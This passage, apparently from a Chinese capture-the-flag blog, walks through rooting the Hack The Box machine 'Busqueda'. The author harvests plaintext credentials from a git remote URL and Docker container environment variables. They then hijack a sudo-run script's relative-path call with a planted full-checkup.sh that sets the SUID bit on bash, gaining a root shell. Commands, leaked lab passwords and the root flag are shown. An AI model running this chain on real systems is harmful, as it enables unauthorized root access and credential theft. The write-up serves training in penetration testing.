-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 6 svc  svc  4096 Jun  4 12:57 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache</span><br><span class="line">-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 10:26 .gnupg</span><br><span class="line">drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local</span><br><span class="line">lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 04:06 snap</span><br><span class="line">-rw-r----- 1 root svc    33 Jun  4 03:26 user.txt</span><br><span class="line">-rw------- 1 svc  svc  9573 Jun  4 11:29 .viminfo</span><br><span class="line">-rw------- 1 svc  svc    54 Jun  4 07:23 .Xauthority</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>-l长格式信息,-a 所有</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ cat .gitconfig</span><br><span class="line">cat .gitconfig</span><br><span class="line">[user]</span><br><span class="line">        email = cody@searcher.htb</span><br><span class="line">        name = cody</span><br><span class="line">[core]</span><br><span class="line">        hooksPath = no-hooks</span><br></pre></td></tr></table></figure>
-
-<p>注意到，一开始监听进来时，有&#x2F;var&#x2F;www&#x2F;app，查看下隐藏文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/home$  ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd /var/www/app</span><br><span class="line">cd /var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .git</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates</span><br><span class="line">svc@busqueda:/var/www/app$ </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/var/www/app$ cd .git</span><br><span class="line">cd .git</span><br><span class="line">svc@busqueda:/var/www/app/.git$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches</span><br><span class="line">-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG</span><br><span class="line">-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config</span><br><span class="line">-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description</span><br><span class="line">-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks</span><br><span class="line">-rw-r--r-- 1 root     root      259 Apr  3 15:09 index</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs</span><br><span class="line">drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects</span><br><span class="line">drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>看下config和logs</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">svc@busqueda:/var/www/app/.git$ cat config</span><br><span class="line">cat config</span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cd main</span><br><span class="line">cd main</span><br><span class="line">bash: cd: main: Not a directory</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cat main</span><br><span class="line">cat main</span><br><span class="line">0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000  update by push</span><br><span class="line">这里大佬已经试用过了，哈希值破不开，转看config</span><br></pre></td></tr></table></figure>
-
-<p>哎，上述内容在大佬博客里引入了linpeas工具，应该是可以帮助自动查找文件的。</p>
-<p>关注下这串代码：</p>
-<p><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></p>
-<p>尝试下cody后的东西作为密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#x73;&#118;&#99;&#x40;&#49;&#x30;&#46;&#x31;&#48;&#46;&#49;&#x31;&#46;&#50;&#x30;&#56;">&#x73;&#118;&#99;&#x40;&#49;&#x30;&#46;&#x31;&#48;&#46;&#49;&#x31;&#46;&#50;&#x30;&#56;</a>，ssh连接即可。</p>
-<h3 id="svc-gt-root"><a href="#svc-gt-root" class="headerlink" title="svc-&gt;root"></a>svc-&gt;root</h3><p>登录进来后</p>
-<p><code>sudo -l</code> 为了看看当前用户可执行的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>之后的操作便是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls 有user.txt</span><br><span class="line"></span><br><span class="line">cd /</span><br><span class="line"></span><br><span class="line">ls   有etc文件夹</span><br><span class="line"></span><br><span class="line">cd etc</span><br><span class="line"></span><br><span class="line">ls ，看到了有apache2文件夹</span><br><span class="line"></span><br><span class="line">cd apache2</span><br><span class="line">svc@busqueda:/etc/apache2$ ls</span><br><span class="line">apache2.conf    conf-enabled  magic           mods-enabled  sites-available</span><br><span class="line">conf-available  envvars       mods-available  ports.conf    sites-enabled</span><br><span class="line">svc@busqueda:/etc/apache2$ cat  sites-available</span><br><span class="line"></span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -a</span><br><span class="line">.  ..  000-default.conf  default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr  4 16:08 .</span><br><span class="line">drwxr-xr-x 8 root root 4096 Apr  4 16:08 ..</span><br><span class="line">-rw-r--r-- 1 root root  837 Feb 20 14:06 000-default.conf</span><br><span class="line">-rw-r--r-- 1 root root 6338 Sep 30  2022 default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ cat 000-default.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p>内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:5000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:5000/</span><br><span class="line"></span><br><span class="line">        RewriteEngine On</span><br><span class="line">        RewriteCond %&#123;HTTP_HOST&#125; !^searcher.htb$</span><br><span class="line">        RewriteRule /.* http://searcher.htb/ [R]</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName gitea.searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:3000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:3000/</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>发现了gitea.searcher.htb网址，尝试登录：http或https，或加上端口3000都不行，想到添加域名</p>
-<p>切换到主机的终端</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# vim /etc/hosts</span><br><span class="line"></span><br><span class="line">添加</span><br><span class="line">10.10.11.208 gitea.searcher.htb</span><br></pre></td></tr></table></figure>
-
-<p>打开浏览器输入<a href="http://gitea.searcher.htb/">http://gitea.searcher.htb</a></p>
-<p>点击右上角sign in 出现</p>
-<p><img src="/../../../Typora/img111/image-20230606214158201.png" alt="image-20230606214158201"></p>
-<p>先放一遍。</p>
-<p>再次在svc用户界面下，</p>
-<p>sudo -l，</p>
-<p>关注以下操作。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line">Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)</span><br><span class="line"></span><br><span class="line">     docker-ps     : List running docker containers</span><br><span class="line">     docker-inspect : Inpect a certain docker container</span><br><span class="line">     full-checkup  : Run a full system checkup</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>对这三个命令依次运行一下，</p>
-<p><img src="/../../../Typora/img111/image-20230606222958314.png" alt="image-20230606222958314"></p>
-<p>发现docker-inspect 需要配合 -f和容器名才有显示</p>
-<p>doker-inspect官方说明得：</p>
-<p><a href="https://docs.docker.com/engine/reference/commandline/inspect/">docs.docker.com&#x2F;engine&#x2F;reference&#x2F;commandline&#x2F;inspect&#x2F;</a></p>
-<p><img src="/../../../Typora/img111/image-20230606223323788.png" alt="image-20230606223323788"></p>
-<p>例子：</p>
-<p><code>docker inspect --format=&#39;&#123;&#123;.LogPath&#125;&#125;&#39; $INSTANCE_ID</code></p>
-<p><code>docker inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; $INSTANCE_ID</code></p>
-<p>已知在…docker-ps命令下得到容器ID为960873171e2e和f84a6b33fb5a</p>
-<p>先看ID1的：</p>
-<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; 960873171e2e</code>得：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ </span><br><span class="line">sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#x27;&#123;&#123;json .Config&#125;&#125;&#x27; 960873171e2e</span><br><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;960873171e2e&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;22/tcp&quot;:&#123;&#125;,&quot;3000/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;],&quot;Cmd&quot;:[&quot;/bin/s6-svscan&quot;,&quot;/etc/s6&quot;],&quot;Image&quot;:&quot;gitea/gitea:latest&quot;,&quot;Volumes&quot;:&#123;&quot;/data&quot;:&#123;&#125;,&quot;/etc/localtime&quot;:&#123;&#125;,&quot;/etc/timezone&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;/usr/bin/entrypoint&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;server&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;,&quot;maintainer&quot;:&quot;maintainers@gitea.io&quot;,&quot;org.opencontainers.image.created&quot;:&quot;2022-11-24T13:22:00Z&quot;,&quot;org.opencontainers.image.revision&quot;:&quot;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&quot;,&quot;org.opencontainers.image.source&quot;:&quot;https://github.com/go-gitea/gitea.git&quot;,&quot;org.opencontainers.image.url&quot;:&quot;https://github.com/go-gitea/gitea&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>有数据库信息为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;]</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>GITEA__database__USER&#x3D;gitea”,”GITEA__database__PASSWD&#x3D;yuiu1hoiu4i5ho1uh</p>
-</blockquote>
-<p>看下另一个ID的</p>
-<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; f84a6b33fb5a</code></p>
-<p>得到结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;f84a6b33fb5a&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;3306/tcp&quot;:&#123;&#125;,&quot;33060/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;],&quot;Cmd&quot;:[&quot;mysqld&quot;],&quot;Image&quot;:&quot;mysql:8&quot;,&quot;Volumes&quot;:&#123;&quot;/var/lib/mysql&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;docker-entrypoint.sh&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;db&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>其中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;]</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>“MYSQL_ROOT_PASSWORD&#x3D;jI86kGUuj87guWr3RyF”,”MYSQL_USER&#x3D;gitea”,”MYSQL_PASSWORD&#x3D;yuiu1hoiu4i5ho1uh”,”MYSQL_DATABASE&#x3D;gitea”</p>
-</blockquote>
-<p>好，进入gitea的登录页面，尝试administrator:yuiu1hoiu4i5ho1uh</p>
-<p><img src="/../../../Typora/img111/image-20230607201649485.png" alt="image-20230607201649485"></p>
-<p>点击左边的仓库，发现：</p>
-<p><img src="/../../../Typora/img111/image-20230607201740407.png" alt="image-20230607201740407"></p>
-<p>查看第一行脚本：</p>
-<p><img src="/../../../Typora/img111/image-20230607201759588.png" alt="image-20230607201759588"></p>
-<p>前三个脚本对应了，之前的三个命令。</p>
-<p>查看第四个脚本内容，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">actions = [&#x27;full-checkup&#x27;, &#x27;docker-ps&#x27;,&#x27;docker-inspect&#x27;]</span><br><span class="line"></span><br><span class="line">def run_command(arg_list):</span><br><span class="line">    r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">    if r.stderr:</span><br><span class="line">        output = r.stderr.decode()</span><br><span class="line">    else:</span><br><span class="line">        output = r.stdout.decode()</span><br><span class="line"></span><br><span class="line">    return output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_action(action):</span><br><span class="line">    if action == &#x27;docker-inspect&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            _format = sys.argv[2]</span><br><span class="line">            if len(_format) == 0:</span><br><span class="line">                print(f&quot;Format can&#x27;t be empty&quot;)</span><br><span class="line">                exit(1)</span><br><span class="line">            container = sys.argv[3]</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;inspect&#x27;, &#x27;--format&#x27;, _format, container]</span><br><span class="line">            print(run_command(arg_list)) </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">        except IndexError:</span><br><span class="line">            print(f&quot;Usage: &#123;sys.argv[0]&#125; docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">    </span><br><span class="line">    elif action == &#x27;docker-ps&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;docker&#x27;, &#x27;ps&#x27;]</span><br><span class="line">            print(run_command(arg_list)) </span><br><span class="line">        </span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line"></span><br><span class="line">    elif action == &#x27;full-checkup&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            arg_list = [&#x27;./full-checkup.sh&#x27;]</span><br><span class="line">            print(run_command(arg_list))</span><br><span class="line">            print(&#x27;[+] Done!&#x27;)</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;Something went wrong&#x27;)</span><br><span class="line">            exit(1)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        action = sys.argv[1]</span><br><span class="line">        if action in actions:</span><br><span class="line">            process_action(action)</span><br><span class="line">        else:</span><br><span class="line">            raise IndexError</span><br><span class="line"></span><br><span class="line">    except IndexError:</span><br><span class="line">        print(f&#x27;Usage: &#123;sys.argv[0]&#125; &lt;action&gt; (arg1) (arg2)&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        print(&#x27;     docker-ps     : List running docker containers&#x27;)</span><br><span class="line">        print(&#x27;     docker-inspect : Inpect a certain docker container&#x27;)</span><br><span class="line">        print(&#x27;     full-checkup  : Run a full system checkup&#x27;)</span><br><span class="line">        print(&#x27;&#x27;)</span><br><span class="line">        exit(1)</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>   elif action &#x3D;&#x3D; ‘full-checkup’:<br>       try:<br>           arg_list &#x3D; [‘.&#x2F;full-checkup.sh’]<br>           print(run_command(arg_list))<br>           print(‘[+] Done!’)<br>       except:<br>           print(‘Something went wrong’)<br>           exit(1)</p>
-</blockquote>
-<p>得：所读取路径不是绝对路径，它在当前目录下找full-checkup.sh的，如果在用户界面中非&#x2F;opt&#x2F;scripts&#x2F;位置下，就会出现报错。</p>
-<p>vim full-checkup.sh，内容为：</p>
-<blockquote>
-<p>#!&#x2F;bin&#x2F;bash<br>cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash<br>chmod +s &#x2F;tmp&#x2F;bash</p>
-</blockquote>
-<p>这段脚本的作用是创建了一个具有Setuid权限的”&#x2F;tmp&#x2F;bash”文件。通过设置Setuid权限，任何以该文件执行的用户都会暂时获得文件所有者（通常为root）的权限。这意味着，当普通用户执行”&#x2F;tmp&#x2F;bash”时，它将以root用户的权限执行，从而实现了权限提升。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ pwd</span><br><span class="line">/home/svc</span><br><span class="line">-bash-5.1$ vim full-checkup.sh</span><br><span class="line">-bash-5.1$ chmod +x full-checkup.sh</span><br><span class="line">-bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</span><br><span class="line">[sudo] password for svc: </span><br><span class="line"></span><br><span class="line">[+] Done!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-bash-5.1$ whoami</span><br><span class="line">svc</span><br><span class="line">-bash-5.1$ ls -la /bin/bash</span><br><span class="line">-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash</span><br><span class="line"></span><br><span class="line">成功给 /bin/bash 带上suid提权成功</span><br><span class="line">-bash-5.1$ /bin/bash -p</span><br><span class="line">bash-5.1# whoami</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-5.1# cd /root</span><br><span class="line">bash-5.1# ls -la</span><br><span class="line">total 60</span><br><span class="line">drwx------  9 root root 4096 Apr  3 16:01 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:09 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .cache</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 .config</span><br><span class="line">-rw-r-----  1 root root  430 Apr  3 15:13 ecosystem.config.js</span><br><span class="line">-rw-r--r--  1 root root  104 Apr  3 08:58 .gitconfig</span><br><span class="line">drwxr-xr-x  3 root root 4096 Mar  1 10:46 .local</span><br><span class="line">-rw-------  1 root root   50 Feb 20 12:04 .my.cnf</span><br><span class="line">lrwxrwxrwx  1 root root    9 Feb 20 12:12 .mysql_history -&gt; /dev/null</span><br><span class="line">drwxr-xr-x  4 root root 4096 Mar  1 10:46 .npm</span><br><span class="line">drwxr-xr-x  5 root root 4096 Jun  7 04:20 .pm2</span><br><span class="line">-rw-r--r--  1 root root  161 Jul  9  2019 .profile</span><br><span class="line">-rw-r-----  1 root root   33 Jun  7 04:20 root.txt</span><br><span class="line">drwxr-xr-x  4 root root 4096 Apr  3 16:01 scripts</span><br><span class="line">drwx------  3 root root 4096 Mar  1 10:46 snap</span><br><span class="line">bash-5.1# cat root.txt</span><br><span class="line">105666c0b97b4202de7dabf892feb190</span><br><span class="line">bash-5.1# </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>跟随大佬的wp思路进行，达到提权的目的。</p>
-<p>1.nmap扫到端口为80，与22</p>
